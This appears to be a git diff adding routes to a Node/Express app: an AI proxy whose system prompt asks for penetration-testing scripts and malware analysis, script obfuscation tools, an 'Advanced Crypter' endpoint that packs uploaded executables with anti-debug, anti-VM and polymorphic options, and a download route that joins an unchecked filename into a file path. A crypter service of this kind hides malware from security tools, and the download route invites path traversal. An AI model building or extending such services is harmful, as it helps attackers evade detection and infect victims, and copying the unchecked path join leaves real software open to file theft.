@@ -809,6 +809,228 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Millennium AI route
+  app.post('/api/millennium-ai', async (req, res) => {
+    try {
+      const { prompt } = req.body;
+      
+      if (!process.env.GROQ_API_KEY) {
+        return res.status(500).json({ message: 'AI service not configured' });
+      }
+
+      const systemPrompt = `You are Millennium AI, an advanced cybersecurity assistant specialized in:
+- Writing penetration testing scripts and tools
+- Analyzing malware and security vulnerabilities  
+- Explaining cybersecurity concepts and techniques
+- Generating code for educational red team exercises
+- Providing guidance on ethical hacking practices
+
+Always emphasize that your responses are for educational and authorized testing purposes only.`;
+
+      const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${process.env.GROQ_API_KEY}`,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          model: 'mixtral-8x7b-32768',
+          messages: [
+            { role: 'system', content: systemPrompt },
+            { role: 'user', content: prompt }
+          ],
+          max_tokens: 2048,
+          temperature: 0.7
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error(`AI API error: ${response.status}`);
+      }
+
+      const data = await response.json();
+      const aiResponse = data.choices[0]?.message?.content || 'No response generated';
+
+      res.json({ response: aiResponse });
+    } catch (error) {
+      console.error('Millennium AI error:', error);
+      res.status(500).json({ message: 'AI processing failed' });
+    }
+  });
+
+  // Script Processing Tools
+  app.post('/api/script-tools', async (req, res) => {
+    try {
+      const { script, tool } = req.body;
+      
+      let processedScript = '';
+      
+      switch (tool) {
+        case 'syntax-fixer':
+          // Basic syntax fixing logic
+          processedScript = script
+            .replace(/;\s*\n/g, ';\n')
+            .replace(/{\s*\n/g, '{\n')
+            .replace(/}\s*\n/g, '}\n')
+            .replace(/,\s*\n/g, ',\n');
+          break;
+          
+        case 'minifier':
+          // Basic minification
+          processedScript = script
+            .replace(/\/\*[\s\S]*?\*\//g, '')
+            .replace(/\/\/.*$/gm, '')
+            .replace(/\s+/g, ' ')
+            .replace(/;\s*}/g, '}')
+            .trim();
+          break;
+          
+        case 'obfuscator':
+          // Basic obfuscation
+          const chars = 'abcdefghijklmnopqrstuvwxyz';
+          const varMap = new Map();
+          let counter = 0;
+          
+          processedScript = script.replace(/\b[a-zA-Z_][a-zA-Z0-9_]*\b/g, (match) => {
+            if (!varMap.has(match)) {
+              varMap.set(match, '_' + chars[counter % chars.length] + Math.floor(counter / chars.length));
+              counter++;
+            }
+            return varMap.get(match);
+          });
+          break;
+          
+        case 'deobfuscator':
+          // Basic deobfuscation attempt
+          processedScript = script
+            .replace(/eval\s*\(/g, '// EVAL_DETECTED: ')
+            .replace(/String\.fromCharCode\s*\(/g, '// CHAR_DECODE: ')
+            .replace(/\\x[0-9a-fA-F]{2}/g, (match) => {
+              return String.fromCharCode(parseInt(match.substr(2), 16));
+            });
+          break;
+          
+        default:
+          processedScript = script;
+      }
+      
+      // Log script processing
+      await storage.createAnalytics({
+        metric: 'script_tool_usage',
+        value: JSON.stringify({
+          tool,
+          inputLength: script.length,
+          outputLength: processedScript.length,
+          timestamp: new Date().toISOString()
+        })
+      });
+      
+      res.json({ processedScript });
+    } catch (error) {
+      console.error('Script processing error:', error);
+      res.status(500).json({ message: 'Script processing failed' });
+    }
+  });
+
+  // Advanced Crypter
+  app.post('/api/advanced-crypter', requireAuth, async (req, res) => {
+    try {
+      const multer = require('multer');
+      const upload = multer({ dest: 'temp/' });
+      
+      upload.single('file')(req, res, async (err) => {
+        if (err) {
+          return res.status(400).json({ message: 'File upload failed' });
+        }
+        
+        const config = JSON.parse(req.body.config);
+        const inputFile = req.file;
+        
+        if (!inputFile) {
+          return res.status(400).json({ message: 'No file uploaded' });
+        }
+        
+        // Create advanced crypter process
+        const { spawn } = require('child_process');
+        const outputPath = `builds/${config.outputName}.exe`;
+        
+        const crypterArgs = [
+          'python_tools/elite_toolkit.py',
+          '--crypter',
+          '--input', inputFile.path,
+          '--output', outputPath,
+          '--compression', config.compressionLevel
+        ];
+        
+        if (config.antiDebug) crypterArgs.push('--anti-debug');
+        if (config.antiVM) crypterArgs.push('--anti-vm');
+        if (config.polymorphic) crypterArgs.push('--polymorphic');
+        if (config.dotNetSupport) crypterArgs.push('--dotnet');
+        
+        const crypterProcess = spawn('python3', crypterArgs, {
+          stdio: 'pipe',
+          cwd: process.cwd()
+        });
+        
+        let output = '';
+        let error = '';
+        
+        crypterProcess.stdout.on('data', (data) => {
+          output += data.toString();
+        });
+        
+        crypterProcess.stderr.on('data', (data) => {
+          error += data.toString();
+        });
+        
+        crypterProcess.on('close', (code) => {
+          // Cleanup temp file
+          require('fs').unlinkSync(inputFile.path);
+          
+          if (code === 0) {
+            res.json({
+              success: true,
+              downloadUrl: `/download/${config.outputName}.exe`,
+              filename: `${config.outputName}.exe`,
+              output
+            });
+          } else {
+            res.json({
+              success: false,
+              error: error || 'Crypter processing failed',
+              output
+            });
+          }
+        });
+        
+        // Log crypter usage
+        await storage.createAnalytics({
+          metric: 'crypter_usage',
+          value: JSON.stringify({
+            config,
+            timestamp: new Date().toISOString(),
+            inputSize: inputFile.size
+          })
+        });
+      });
+    } catch (error) {
+      console.error('Crypter error:', error);
+      res.status(500).json({ message: 'Crypter processing failed' });
+    }
+  });
+
+  // File download endpoint
+  app.get('/download/:filename', (req, res) => {
+    const filename = req.params.filename;
+    const filepath = require('path').join(process.cwd(), 'builds', filename);
+    
+    if (require('fs').existsSync(filepath)) {
+      res.download(filepath);
+    } else {
+      res.status(404).json({ message: 'File not found' });
+    }
+  });
+
   // Groq AI Analysis route
   app.post('/api/groq-analysis', requireAuth, async (req, res) => {
     try {
